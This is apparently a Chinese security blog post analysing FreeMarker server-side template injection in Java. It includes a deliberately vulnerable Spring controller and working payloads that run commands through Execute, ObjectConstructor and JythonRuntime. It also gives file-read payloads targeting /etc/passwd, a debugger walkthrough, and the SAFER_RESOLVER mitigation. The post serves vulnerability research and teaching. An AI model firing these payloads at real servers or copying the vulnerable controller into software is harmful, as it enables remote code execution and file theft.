---
title: "Java Freemarker SSTI"
onlyTitle: true
date: 2025-5-1 16:40:06
categories:
- java
- SSTI
tags:
- Freemarker
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8153.jpg
---



# Java Freemarker SSTI

最新版本也能注入，具体看有没有通过`freemarker.core.Configurable#setNewBuiltinClassResolver`方法进行安全设置

代码测试环境（位于HelloController）：https://github.com/godownio/SSTIVuln

pom：

```xml
        <dependency>
            <groupId>org.freemarker</groupId>
            <artifactId>freemarker</artifactId>
            <version>2.3.32</version>
        </dependency>
```

## Freemarker的使用

准备一个ftl文件，放在resources/templates目录下

```ftl
Hello, ${name}!
```

写Java代码加载并渲染模板

```java
import freemarker.template.*;

import java.io.StringWriter;
import java.util.HashMap;
import java.util.Map;

public class FreemarkerExample {
    public static void main(String[] args) throws Exception {
        Configuration cfg = new Configuration(Configuration.VERSION_2_3_32);
        cfg.setClassForTemplateLoading(FreemarkerExample.class, "/templates"); // 模板文件目录
        cfg.setDefaultEncoding("UTF-8");

        Template template = cfg.getTemplate("hello.ftl");

        Map<String, Object> data = new HashMap<>();
        data.put("name", "Alice");

        StringWriter writer = new StringWriter();
        template.process(data, writer);

        System.out.println(writer.toString());
    }
}

```

可以看到Alice代替了`${name}`被输出

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250428170556049.png)

上面这个代码是脱离spring环境去使用的Freemarker

springBoot 集成Freemarker就更简单了：

application.yml配置，指定用freemarker去找templates目录下的ftl文件解析：

```yaml
spring:
  freemarker:
    template-loader-path: classpath:/templates/
    suffix: .ftl
    charset: UTF-8
```

Controller直接返回`.ftl`，注意如果你的环境即有Thymeleaf又有freemarker，springBoot默认优先用Thymeleaf去解析模板，得把Thymeleaf依赖注释掉

```java
@Controller
public class HelloController {

    @PostMapping("/freemarker")
    public String hello(@RequestParam String payload, Model model) {
        model.addAttribute("name", payload);
        return "hello"; // 自动找 hello.ftl
    }
}
```

## FTL语法

简单的提一下几个漏洞触发会用到的语法，其他的感兴趣可以官网见

| 功能         | 示例                                        |
| :----------- | :------------------------------------------ |
| 变量         | `${name}`                                   |
| 条件判断     | `<#if age gt 18>Adult<#else>Minor</#if>`    |
| 循环         | `<#list users as user>${user.name}</#list>` |
| 调用方法     | `${user.getName()}`                         |
| 引入其他模板 | `<#include "footer.ftl">`                   |

`#`和`@`搭配使用，`#`定义，`@`调用，效果等同函数，定义一个可复用的片段：

```ftl
<#macro sayHello name>
  Hello, ${name}!
</#macro>

<@sayHello name="Tom"/>
```

`assign` 就是 在模板中**声明变量、做赋值、准备数据**的指令，必须是 `<#assign>`，不能是 `<#Assign>`，大小写敏感。

比如以下三种定义的变量的使用，分别是定义变量、定义Map、定义list和在assign中进行简单运算并赋值

```ftl
<#assign name = "Tom">
<#assign person = {"name": "Alice", "age": 20}>
<#assign animals = ["cat", "dog", "bird"]>
<#assign sum = 2 + 3>
```

还有很多内置函数，这里说两个漏洞利用中会用到的

### 内建函数 new

`new` 是一个内建函数，用来在模板中创建 "对象实例"。就是你可以在模板里，像在 Java 里 `new 一个对象` 一样。但注意：FreeMarker 里 `new` 出来的不是任意 Java 类，只能是 **FreeMarker 支持的特定类型**。

语法为：`<要处理的对象>?new`

比如new一个WordWrapperDirective赋值给word_wrapp：`<#assign word_wrapp = "com.acmee.freemarker.WordWrapperDirective"?new()>`

注意new_list、new_map和new不一样，new_list和new_map是单独的内置函数，虽然使用上是一样的

比如new一个空list赋值给animals：`<#assign animals = []?new_list>`

或者new一个Map赋给person：`<#assign person = {}?new_map>`

该内建函数可以创建任意的 Java 对象，只要类实现了 **TemplateModel** 接口即可创建，进而使用这些对象， 并且可以触发没有实现 TemplateModel 接口的类的静态初始化块。美妙的链子警告

### api

api 内建函数于 FreeMarker 2.3.22 版本出现，之前版本不存在

*  `?api` 是什么？

在 FreeMarker 里，`?api` 内建函数的作用是：

> **把一个普通的 Java 对象**，暴露成一个可以**直接调用 Java 方法和字段**的对象。

正常情况下，FreeMarker模板是安全沙箱的 —— 它不允许你直接在模板里调用任意 Java 类或者方法，以避免安全问题。

而 `?api` 就是一个突破限制的“开关”。

举个例子：

假设有个Person类：

```java
public class Person {
    private String name;

    public String getName() {
        return name;
    }
}
```

你在模板里拿到一个 `person` 对象，正常只能通过 `${person.name}` 来取属性。

但是如果用了 `?api`，就可以直接调用方法：

```java
${person?api.getName()}
```

在 2.3.22 之前，FreeMarker对 Java 对象访问控制得很严格（只通过 getter / 公开字段），但大家在实际开发中有很多需要更灵活操作 Java 对象的需求，所以从 2.3.22 起，官方引入了 `?api`，允许开发者自愿打开这个“低层访问”的功能。当然，默认是关着的，需要在配置里允许（通过 `ObjectWrapper` 设置）。

## Freemarker模板注入漏洞分析

把hello.ftl修改为如下：

```java
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc")}
```

在对该模板进行渲染的时候就会触发漏洞

```java
public class nospringToFTL {
    public static void main(String[] args) throws Exception {
        Configuration cfg = new Configuration();
        cfg.setClassForTemplateLoading(nospringToFTL.class, "/templates"); // 模板文件目录
        cfg.setDefaultEncoding("UTF-8");

        Template template = cfg.getTemplate("hello.ftl");

        Map<String, Object> data = new HashMap<>();

        StringWriter writer = new StringWriter();
        template.process(data, writer);

        System.out.println(writer.toString());
    }
}
```

那么按照一般的场景，如下：

```
Hello, ${name}!
```

向name传参payload能顺利执行吗？答案是不可以。直接渲染用户输入`${}`占位符的内容会进行转码，所以payload会失效。想要顺利的进行命令执行必须直接控制模板内容，看起来非常鸡肋，也确实鸡肋。。一般的利用场景为上传或直接能修改模板内容，而不是直接渲染用户输入去触发。所以，严格说来根本不算注入型的漏洞

那寻找那万分之一的可能，如果真有注入模板的场景，那代码长什么样？

如下代码：

后续我们分析均是用如下代码作为demo

```java
@Controller
public class HelloController {
    private Configuration freemarkerConfig = new Configuration();

    private final StringTemplateLoader dynamicLoader = new StringTemplateLoader();

    @PostConstruct
    public void setupTemplateLoader() {
        TemplateLoader[] loaders = new TemplateLoader[] {
                dynamicLoader,
                freemarkerConfig.getTemplateLoader()
        };
        freemarkerConfig.setTemplateLoader(new MultiTemplateLoader(loaders));
    }

    @PostMapping("/template")
    public String render(@RequestParam Map<String, String> templates) throws Exception {
        // 设置模板
        for (Map.Entry<String, String> entry : templates.entrySet()) {
            dynamicLoader.putTemplate(entry.getKey(), entry.getValue());
        }

        // 获取模板
        Template t = freemarkerConfig.getTemplate("payload");
        Map<String, Object> model = new HashMap<>();

        StringWriter out = new StringWriter();
        t.process(model, out);
        return out.toString(); // 返回渲染结果
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429154326953.png)

freemarker.template.Configuration为配置器，在 FreeMarker 中，`StringTemplateLoader` 的 `putTemplate(String name, String templateContent)` 方法用于将模板添加到加载器中。

这种方式会直接把整个用户输入作为模板，而不是嵌入值。我们之后测试就用这个代码作为环境，这种通过java代码设置Configuration的方式，可以省略application.yml。因为getTemplate("payload")是指定渲染模板名为payload的模板

所以payload必须key名与getTemplate参数一致：`payload=%3C%23assign+value%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7Bvalue%28%22calc%22%29%7D`

如果你多次调用 `putTemplate` 方法，并使用相同的模板名称（`name`），那么后一次的调用会覆盖前一次的模板内容。

### payload

以下payload均是直接修改ftl才能触发，而不是向`${}`传参

> 我突然想起python SSTI也是render(payload字符串)去触发，而不是向占位符传参。

new触发：

```html
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc")}
```

```html
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","Calc").start()}
```

下面这个需要目标有完整的Jython依赖

```html
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc")</@value>
```

api触发：

```html
<#assign classLoader=object?api.class.protectionDomain.classLoader> 
<#assign clazz=classLoader.loadClass("ClassExposingGSON")> 
<#assign field=clazz?api.getField("GSON")> 
<#assign gson=field?api.get(null)> 
<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))> 
${ex("calc"")}
```

读文件

```html
<#assign is=object?api.class.getResourceAsStream("/Test.class")>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]
<#assign uri=object?api.class.getResource("/").toURI()>
<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
<#assign is=input?api.getInputStream()>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]
```

### 调试分析

用的payload：`<#assign value="freemarker.template.utility.Execute"?new()>${value("calc")}`，yakit记得url编码

#### 字符串分割

freemarkerConfig.getTemplate作为字符串分割的入口

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429202216300.png)

经过如下栈后，在freemarker.core.FMParser#MixedContentElement对字符串进行分割

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429202544024.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429202527501.png)

因为开头的`<#`，如下一堆case都是以`<#`开头的，调用FreemarkerDirective，而且我们的`<#assign`也属于这里面

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429202752859.png)

跟进后FreemarkerDirective函数，发现调用Assign

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429203000067.png)

Assgin就是根据标签分离`<#assign`片段

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429203215328.png)

下面的具体操作我们就不看了，知道整个分割的过程发生在freemarker.core.FMParser#MixedContentElement即可。最后得到的结果是一个`<#assign>`片段和一个`${value}`片段

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429203338188.png)

#### 模板解析

将断点打到freemarker.template.Template#process处

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429162409739.png)

经过如下调用栈，来到freemarker.core.Environment#visit()方法

先是一个对当前element的压栈，然后调用了element.accept。accept得到的结果就是上一节分离得到的两个片段，然后调用visit(el)，这是一个递归调用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429170848599.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429203654524.png)

不要被压栈退栈搞晕了，简单说来，就是进行递归访问模板元素，处理子元素

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429205349773.png)

#### 解析`<#assign>`

首先是处理`<#assign>`元素，看到调用element为`<#assign value="freemarker.template.utility.Execute"?new()>`片段的accept方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429205516516.png)

进到Assignment#accept方法内，处理赋值操作符为等于号（=）的情况，调用 valueExp.eval(env) 计算表达式的值并赋给变量 value

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250429205848021.png)

跟进eval，持续跟进到`freemarker.core.MethodCall#_eval`函数，这是Freemarker解析模板标签最关键的函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501141057195.png)

我挨个解释一下：

1. 首先对目标表达式（target）进行求值，得到一个TemplateModel对象；
2. 如果该对象是TemplateMethodModel类型，则：
   若为扩展方法模型（TemplateMethodModelEx），获取参数的模型列表；
   否则获取参数的值列表；
   执行方法并返回结果包装后的内容；
3. 如果目标是宏（Macro），则调用宏并返回结果；

首先target是`"freemarker.template.utility.Execute"?new`，eval后得到封装好`Execute`类的一个构造器类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501141618780.png)

然后跟进exec内，实例化了`Execute`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501142423132.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501142459568.png)

#### 解析`${value("calc")}`

跟进到DollerVariable#accept，看这个类名也知道，是用来解析`${}`的类。accept方法内，可以看到当前是处理`${value("calc")}`。跟进该方法的calculateInterpolatedStringOrMarkup方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501142915903.png)

调用了escapedExpression.eval

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501152810924.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501152904218.png)

跟进到MethodCall._eval，这里target.eval(env)是从环境变量中取出键为`value`的值，执行的结果就是Execute类，然后调用到了Execute.exec执行了代码。我们唯一需要关心的是，因为这个if的原因，取到的类必须是TemplatesMethodModel的子类，所以选择的Execute。这个类集成了TemplatesMethodModel

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501153041361.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501153201559.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501153316139.png)

除此以外，另外的一个payload用到的freemarker.template.utility.ObjectConstructor也满足继承了TemplateMethodModel的条件，且能调用任意构造函数

target.eval就是根据不同的target去取值，我这里不想调了，感兴趣的可以跟一下，应该很简单，写上来会很乱

### 调试分析2

而JythonRuntime用到的就是截然不同的一条路径了

```html
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc")</@value>
```

`@value` 表示将 `value` 这个变量当作一个**用户自定义指令（directive）**来调用。FreeMarker 允许这种用法，但仅当这个对象实现了 `TemplateDirectiveModel` 接口。而某些特殊类如 `JythonRuntime`（在一些漏洞版本中）被恶意使用时，可以达到执行任意代码的效果。

不过这个调用方式需要目标有Jython的完整依赖：

```xml
        <dependency>
            <groupId>org.python</groupId>
            <artifactId>jython-standalone</artifactId>
            <version>2.7.3</version>
        </dependency>
```

调用 `<@value>import os; os.system("calc")</@value>` 会触发以下逻辑：

* step 1：FreeMarker 调用 `getWriter(...)`
* step 2：模板内容写入匿名 Writer

内容 `import os; os.system("calc")` 被写入匿名 `Writer` 的 `buf` 缓冲区。

* step 3：模板引擎关闭 Writer → 调用 `close()` → `interpretBuffer()`，以python形式执行exec

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501162650495.png)

我们打个断点看看，怎么调用到getWriter的

因为是调用自定义函数的原因，`<@`的解析来到了UnifiedCall.accept，先是照常，解析value，发现对应的是前面定义的JythonRuntime，然后JythonRuntime匹配各种if，最后来到了env.visitAndTransform

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501162758647.png)

然后一进来就调用了getWriter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250501163020553.png)

但是这种利用方式就是看个乐子

API的利用方式这里就不调了



从 **2.3.17**版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：
 1、UNRESTRICTED_RESOLVER：可以通过 `ClassUtil.forName(className)` 获取任何类。
 2、SAFER_RESOLVER：不能加载 `freemarker.template.utility.JythonRuntime`、`freemarker.template.utility.Execute`、`freemarker.template.utility.ObjectConstructor`这三个类。
 3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。
 可通过`freemarker.core.Configurable#setNewBuiltinClassResolver`方法设置`TemplateClassResolver`，从而限制通过`new()`函数对`freemarker.template.utility.JythonRuntime`、`freemarker.template.utility.Execute`、`freemarker.template.utility.ObjectConstructor`这三个类的解析。

官网的修复：https://freemarker.apache.org/docs/versions_2_3_17.html

当然，我们遇到的freemarker很有可能没开这个安全配置，爽爽注入了
